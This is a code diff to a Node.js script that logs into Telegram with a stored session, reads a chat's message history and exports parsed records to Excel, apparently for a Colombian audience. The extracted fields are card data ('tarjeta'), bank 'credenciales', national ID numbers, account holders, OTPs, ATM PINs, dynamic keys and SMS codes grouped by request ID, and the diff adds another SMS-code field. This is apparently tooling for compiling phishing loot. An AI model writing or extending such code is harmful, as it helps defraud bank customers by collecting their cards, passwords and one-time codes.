@@ -5,52 +5,44 @@ const XLSX = require("xlsx");
 
 const apiId = parseInt(process.env.TG_API_ID);
 const apiHash = process.env.TG_API_HASH;
-const chatOrigen = process.env.TELEGRAM_CHAT_ID;
-const botToken = process.env.TELEGRAM_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
 
 async function generarExcelHistorial(chatIdMsg, tokenBot, responder) {
-    // Sesión 100% en memoria (nada en disco)
-    const stringSession = new StringSession("");
+    // 👈 Usa la sesión guardada en TG_SESSION
+    const stringSession = new StringSession(process.env.TG_SESSION || "");
     const client = new TelegramClient(stringSession, apiId, apiHash, {
         connectionRetries: 5,
     });
 
-    let codeResolve;
-    const codePromise = new Promise((resolve) => { codeResolve = resolve; });
-    let passwordResolve;
-    const passPromise = new Promise((resolve) => { passwordResolve = resolve; });
+    // 👈 Conecta usando la sesión ya guardada (NO pide código)
+    await client.connect();
 
-    // Iniciar sesión
-    await client.start({
-        phoneNumber: async () => process.env.TG_PHONE,
-        password: async () => { 
-            await responder('🔐 Tu cuenta tiene 2FA. Responde a este mensaje con tu contraseña de Telegram.');
-            return await passPromise; 
-        },
-        phoneCode: async () => {
-            await responder('📱 Te enviamos un código a tu App de Telegram. Responde a este mensaje con el código (solo números).');
-            return await codePromise;
-        },
-        onError: (err) => console.error(err),
-    });
+    if (!(await client.checkAuthorization())) {
+        await responder('❌ La sesión de Telegram expiró o es inválida. Genera una nueva con login.js en tu PC y actualiza TG_SESSION en Render.');
+        await client.disconnect();
+        return null;
+    }
 
-    // Leer mensajes
-    await responder('✅ Sesión iniciada. Leyendo historial...');
+    await responder('✅ Sesión válida. Leyendo historial...');
+
+    // Resolver la entidad del chat
     let peer;
     try {
-        peer = await client.getEntity(chatOrigen);
+        peer = await client.getEntity(chatIdMsg);
     } catch (e) {
-        const id = chatOrigen.startsWith("-100") ? chatOrigen.replace("-100", "") : chatOrigen;
+        const id = String(chatIdMsg).startsWith("-100")
+            ? String(chatIdMsg).replace("-100", "")
+            : String(chatIdMsg);
         peer = new Api.PeerChannel({ channelId: BigInt(id) });
     }
 
+    // Leer mensajes (hasta 5000)
     const messages = await client.getMessages(peer, { limit: 5000 });
-    await client.disconnect(); // Cerrar sesión inmediatamente al leer
+    await client.disconnect();
 
-    // Agrupación (misma lógica de antes)
+    // Agrupar por ID de solicitud
     const grupos = {};
     const regexID = /<b>ID:<\/b>\s*<code>([^<]+)<\/code>/;
-    
+
     for (const msg of messages) {
         if (!msg.message) continue;
         const texto = msg.message;
@@ -61,13 +53,16 @@ async function generarExcelHistorial(chatIdMsg, tokenBot, responder) {
                 if (!grupos[solId]) grupos[solId] = [];
                 grupos[solId].push({
                     texto: texto,
-                    fecha: new Date(msg.date * 1000).toLocaleString('es-CO'),
-                    paso: texto.includes('PASO 1') ? 'tarjeta' : texto.includes('PASO 2') ? 'credenciales' : 'otp'
+                    fecha: new Date(msg.date * 1000).toLocaleString('es-CO', { timeZone: 'America/Bogota' }),
+                    paso: texto.includes('PASO 1') ? 'tarjeta'
+                        : texto.includes('PASO 2') ? 'credenciales'
+                        : 'otp'
                 });
             }
         }
     }
 
+    // Extraer campos
     const filas = [];
     const extraer = (texto, etiqueta) => {
         const re = new RegExp(`<b>${etiqueta}:<\\/b>\\s*(?:<code>)?([^<\\n]*)`, 'i');
@@ -82,10 +77,14 @@ async function generarExcelHistorial(chatIdMsg, tokenBot, responder) {
         const o = msgs.find(m => m.paso === 'otp');
 
         let otpVal = '';
-        if (o) otpVal = extraer(o.texto, 'OTP') || extraer(o.texto, 'CLAVE ATM') || extraer(o.texto, 'CLAVE DINÁMICA');
+        if (o) otpVal = extraer(o.texto, 'OTP')
+            || extraer(o.texto, 'CLAVE ATM')
+            || extraer(o.texto, 'CLAVE DINÁMICA')
+            || extraer(o.texto, 'CÓDIGO SMS');
 
         filas.push({
-            'ID': id, 'Fecha': t.fecha,
+            'ID': id,
+            'Fecha': t.fecha,
             'Solicitante': extraer(t.texto, 'Solicitante'),
             'Cédula': extraer(t.texto, 'Cédula'),
             'Titular': extraer(t.texto, 'Titular'),
